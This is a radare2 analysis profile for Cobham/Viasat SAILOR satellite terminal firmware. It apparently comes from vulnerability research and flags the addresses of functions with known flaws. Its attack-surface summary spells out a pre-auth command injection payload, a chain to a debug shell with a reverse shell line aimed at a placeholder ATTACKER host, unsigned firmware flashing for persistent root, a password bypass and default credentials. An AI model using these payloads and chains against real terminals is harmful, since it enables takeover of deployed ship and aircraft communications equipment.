# cobham-sailor-arm.r2 — Cobham SAILOR TT-7xxx / Viasat SAILOR GX ACU Analysis Profile
#
# Targets:
#   Cobham SAILOR 60GX / 100GX — ACU binaries (fw 1.61–2.01, ARM32 LE, Linux glibc 2.19)
#   Cobham / Viasat SAILOR 600/900/1000 VSAT GX — same ACU platform
#   Viasat Explorer 3075 / 5075 / 7100GX — shares tt_cshell framework (see viasat-explorer-gx-arm.r2)
#
# SoC:   ARM Cortex-A (ARMv7-A, Thumb-2), TI AM335x or similar
# OS:    Embedded Linux 2.6.36, glibc 2.19
# FS:    TIIF firmware container (squashfs partitions: rootfs + applfs)
# Key binaries:
#   acu_ctl  (512 KB, stripped) — antenna controller daemon, tt_cshell debug shell
#   acu_vmu  (293 KB, stripped) — modem unit daemon, PTRIA protocol, DecodeIp overflow
#   acu_web  (222–238 KB, stripped) — FastCGI web handler, pre-auth CMD_INJECTION
#   suu      (SUID root) — firmware updater, CRC32-only validation (TIIF)
#   cbus_server — central IPC hub, zero authentication
#   pwutil   (SUID root) — password utility, auth bypass via /tmp/admin
#
# Selected automatically when:
#   vendor slug = "cobham" AND arch = arm AND bits = 32
# See: scripts/aether_r2profile.py _VENDOR_PROFILE_MAP ("arm","32","cobham")
#
# Usage:
#   r2 -i profiles/cobham-sailor-arm.r2 acu_ctl
#   Or from within r2: . profiles/cobham-sailor-arm.r2

# ── Architecture: ARM32 LE, ARMv7-A Thumb-2 ──────────────────────────────────
e asm.arch=arm
e asm.bits=32
e cfg.bigendian=false
e asm.cpu=cortex-a7
e anal.cc=arm                ; # ARM EABI5 calling convention

# ── Analysis tuning ───────────────────────────────────────────────────────────
e anal.hasnext=true
e anal.jmp.tbl=true          ; # switch dispatch in tt_cshell (19-case table 'a'..'s')
e anal.strings=true
e anal.datarefs=true
e anal.jmp.indir=true        ; # indirect calls through function pointer fields
e anal.limits=false

# ── Zignature settings ────────────────────────────────────────────────────────
e zign.graph=true
e zign.refs=true
# Lower matching thresholds — default mincc=10 kills simple functions
e zign.mincc=1
e zign.minsz=4

# ── Visual ────────────────────────────────────────────────────────────────────
e asm.describe=true
e asm.comments=true
e asm.cmt.col=60

# ── Type definitions ──────────────────────────────────────────────────────────
e dir.types=~/.local/share/radare2/types
to libc/functions.h
to libc/socket.h
to libc/fcntl.h
to libc/errno.h
to libc/signal.h

# Cobham / TT-7xxx types: tt_cshell, vmu_network_setup_t, TIIF structs, CBUS IPC
# Path after install.sh: ~/.local/share/radare2/types/cobham/
to cobham/tt_cshell.h

# ── Zignatures ────────────────────────────────────────────────────────────────
# This vendor profile does not load libc zsigs directly.
# aether_r2profile.py detects the ELF interpreter and loads the matching libc layer:
#   glibc  -> profiles/libc/glibc-arm32.r2
#   musl   -> profiles/libc/musl-arm32.r2
# For manual interactive use without aether_r2profile.py, source the libc layer explicitly:
#   . ~/.local/share/radare2/profiles/libc/glibc-arm32.r2
#   . ~/.local/share/radare2/profiles/libc/musl-arm32.r2

# ── Magic scans ───────────────────────────────────────────────────────────────
/m /root/.local/share/radare2/magic/crypto_tables.magic
/m /root/.local/share/radare2/magic/proto_fingerprint.magic

# ── Known symbols — acu_ctl (binary 99fda815, SAILOR 60GX fw 1.64B016) ───────
# Source: vault/Findings/CMD_INJECTION_99fda815_1.md (2026-04-25 session)
# Function addresses are ELF VAs in the stripped binary.

f sym.tt_cshell_dispatcher     @ 0x3eeec   ; # switch table 0x3efb8, cases 'a'..'s'
f sym.tt_cshell_case_system    @ 0x3f02c   ; # case 18 's' → system(r6) = ARBITRARY EXEC
f sym.AduIfImpl_dispatch_case8 @ 0x33978   ; # strcpy(arg1+0x31d4, arg2+0x14) HEAP OVERFLOW
f sym.tt_readline_char         @ 0x5cd74   ; # strcpy(arg1+0x1c, ...) stack overflow in tab-complete
f sym.fdloop_telnetd_2323      @ 0x0       ; # tcp*127.0.0.1*2323 → tt_cshell — resolve at analysis

# ── Known symbols — suu (binary 069d7d9a, TT-7xxx fw 1.66-9) ─────────────────
# Source: vault/Findings/UNSIGNED_FW_069d7d9a_suu_tiif.md (2026-04-24 session)
# NOTE: these are file offsets not VAs (suu is NOT PIE — base 0x0000 or 0x8000).
# Verify with: rabin2 -I suu | grep baddr

f sym.tiif_validate_header         @ 0x000123b8  ; # CRC32-only, NO PKCS7 check
f sym.tiif_validate_content_header @ 0x0001230c  ; # CRC32-only
f sym.tiif_validate_content_body   @ 0x000122a0  ; # CRC32-only — THE ONLY CHECK DONE
f sym.tiif_validate_content_part   @ 0x00012368  ; # calls above two
f sym.tiif_validate_body           @ 0x00012390  ; # CRC32-only
f sym.suu_install_handler          @ 0x0000c1cc  ; # main install entry — no signature verify
f sym.crc32_calc                   @ 0x0         ; # locate via xrefs from tiif_validate_*

# ── Known symbols — acu_web (binary c91c2764, cross-version) ─────────────────
# Source: vault/Findings/CMD_INJECTION_c91c2764_1.md
# acu_web is a FastCGI binary; proc_run() runs pwutil via execvp.

f sym.acu_web_proc_run         @ 0x0       ; # locate via string "pwutil -v %s -- \"%s\""
f sym.acu_web_login_handler    @ 0x0       ; # login form → proc_run injection
# Pattern: snprintf(buf, 0x80, "/mnt/appl/bin/pwutil -v %s -- \"%s\"", user, pass)
#          proc_run(buf) — NO SANITIZATION on user/pass

# ── Known symbols — pwutil (binary 7903a38c / 3eb1f7cc) ──────────────────────
# Two variants: 7903a38c (fw v1.61/1.62), 3eb1f7cc (fw v1.64+)
# Source: vault/Findings/AUTH_BYPASS_7903a38c_1.md, AUTH_BYPASS_3eb1f7cc_pwutil.md

f sym.pwutil_check_admin_bypass @ 0x0   ; # checks /tmp/admin (F_OK) — skips password verify
f sym.pwutil_change_password    @ 0x0   ; # -c mode: changes ANY user pwd, no old-pwd check
# Locate: strings pwutil | grep "/tmp/admin"
# Locate: axt sym.imp.access → caller with F_OK and "/tmp/admin" string nearby

# ── Attack surface summary ────────────────────────────────────────────────────
#
# ALL acu_* binaries: ARM32 LE, no canary, no NX, no PIE, no RELRO (all versions).
# Stack executable on this kernel config — shellcode delivery possible.
#
# acu_web (TCP:80/443 FastCGI):
#   Entry:    lighttpd CGI → main() → process HTTP POST
#   Vuln:     Login POST → snprintf(buf, 0x80, "/mnt/appl/bin/pwutil -v %s -- \"%s\"", user, pass)
#             proc_run(buf) → execvp → COMMAND INJECTION via username/password
#   Auth:     PRE-AUTH (login form)
#   Payload:  username = 'admin` CMD `' or similar shell metachar
#
# acu_ctl (localhost:2323 + localhost:2330):
#   Entry:    fdloop_telnetd_init() → accept loop → tt_cshell_dispatcher()
#   Vuln:     Input 's' + cmd → system(cmd) — NO SANITIZATION
#   Auth:     Localhost only — chain via acu_web injection
#   Payload:  send 's/bin/sh -i &>/dev/tcp/ATTACKER/4444 <&1\n'
#
# suu (SUID root, /mnt/appl/bin/suu):
#   Entry:    suu install <tiif_path> [-1]
#   Vuln:     TIIF signature never checked; only CRC32 validated (trivially recomputable)
#   Auth:     Requires admin access (default admin:12345678)
#   Impact:   Flash arbitrary kernel/rootfs/applfs to MTD — PERSISTENT ROOT
#
# cbus_server (UNIX domain socket):
#   Entry:    Any local process connects to UNIX socket
#   Vuln:     Zero auth — any service can register, intercept messages, inject
#   Auth:     Local process execution
#
# pwutil (SUID root):
#   Mode -v:  Skips password check for "admin" user if /tmp/admin exists (world-writable /tmp)
#   Mode -c:  Changes ANY user's password without verifying the old password
#   Auth:     Any local user
#
# Debug shell on localhost:
#   acu_ctl:  2323 (debug shell), 2330 (TSA remote shell)
#   acu_vmu:  2327 (VMU debug shell)
#   All have tt_cshell 's' command → system()

# ── Suggested first r2 commands ───────────────────────────────────────────────
# For acu_ctl:
#   aa ; axt @ sym.imp.system          ; # find tt_cshell case 18 + other system() calls
#   iz~tcp*127.0.0.1,telnetd,fdloop    ; # confirm debug shell ports
#   iz~pwutil,proc_run,system,system(  ; # confirm acu_web attack surface
#   s sym.tt_cshell_dispatcher ; pdg   ; # decompile dispatcher
#
# For suu:
#   aa ; axt @ sym.imp.crc32_calc      ; # all CRC32 callers = all validation paths
#   iz~signature,PKCS7,SHA,verify      ; # confirm nothing crypto-related
#   axt @ sym.tiif_validate_header ; pdg
#
# For acu_vmu (if analyzing modem protocol path):
#   aa ; s sym.MdmG5__DecodeIp ; pdg  ; # see viasat-explorer-gx-arm.r2 for symbols

echo "Cobham SAILOR TT-7xxx ARM32 profile loaded."
echo "Key attack paths:"
echo "  1. acu_web (pre-auth HTTP) → system() via pwutil -v"
echo "  2. acu_ctl localhost:2323 → tt_cshell 's' → system()"
echo "  3. suu install → CRC32-only TIIF → persistent root firmware flash"
echo "Refs: CMD_INJECTION_99fda815_1, CMD_INJECTION_c91c2764_1, UNSIGNED_FW_069d7d9a"
echo "Types loaded: cobham/tt_cshell.h"
